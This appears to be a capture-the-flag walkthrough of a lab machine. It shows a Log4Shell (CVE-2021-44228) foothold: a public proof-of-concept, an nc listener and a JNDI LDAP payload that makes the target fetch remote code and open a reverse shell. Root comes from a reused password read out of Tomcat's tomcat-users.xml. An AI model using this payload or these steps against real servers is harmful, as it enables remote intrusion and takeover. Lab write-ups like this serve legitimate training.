

# Foothold

website seesm to be vulnerable for log5j

found in source code 

![image](https://github.com/suljov/CTF-Walkthroughs/blob/main/vulnlab/Feedback/Screenshots/Pasted%20image%2020240209210541.png)


![image](https://github.com/suljov/CTF-Walkthroughs/blob/main/vulnlab/Feedback/Screenshots/Pasted%20image%2020240209210505.png)


script to use for exploit 

https://github.com/kozmer/log4j-shell-poc

starting web server 
```
python3 -m http.server 8080
```

starting listener 
```
nc -lvnp 8181
```

exploit 
```
python3 poc.py --userip 10.8.1.92 --webport 8080 --lport 8181

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Exploit java class created success
[+] Setting up LDAP server

[+] Send me: ${jndi:ldap://10.8.1.92:1389/a}

[+] Starting Webserver on port 8080 http://0.0.0.0:8080
Listening on 0.0.0.0:1389
Send LDAP reference result for a redirecting to http://10.8.1.92:8080/Exploit.class
Send LDAP reference result for a redirecting to http://10.8.1.92:8080/Exploit.class
Send LDAP reference result for a redirecting to http://10.8.1.92:8080/Exploit.class
Send LDAP reference result for a redirecting to http://10.8.1.92:8080/Exploit.class
```



![image](https://github.com/suljov/CTF-Walkthroughs/blob/main/vulnlab/Feedback/Screenshots/Pasted%20image%2020240209213453.png)

and we got shell

![image](https://github.com/suljov/CTF-Walkthroughs/blob/main/vulnlab/Feedback/Screenshots/Pasted%20image%2020240209213559.png)



# Privesc



password in tomcat folder allows to login as root


```
cat /opt/tomcat/conf/tomcat-users.xml


<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
  <user username="admin" password="H2RR3rGDrbAnPxWa" roles="manager-gui"/>
  <user username="robot" password="H2RR3rGDrbAnPxWa" roles="manager-script"/>

</tomcat-users>

```


```
tomcat@ip-10-10-10-7:~/conf$ su
Password: 
root@ip-10-10-10-7:/opt/tomcat/conf# whoami
root
root@ip-10-10-10-7:/opt/tomcat/conf# cd /root
root@ip-10-10-10-7:~# cat root.txt 
VL{25da7f42f4e279698c91c0ce911d51a9}
root@ip-10-10-10-7:~# ip add
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 0a:82:7b:12:b8:e1 brd ff:ff:ff:ff:ff:ff
    inet 10.10.67.198/18 brd 10.10.127.255 scope global dynamic eth0
       valid_lft 2179sec preferred_lft 2179sec
    inet6 fe80::882:7bff:fe12:b8e1/64 scope link 
       valid_lft forever preferred_lft forever

```


![image](https://github.com/suljov/CTF-Walkthroughs/blob/main/vulnlab/Feedback/Screenshots/Pasted%20image%2020240209215243.png)


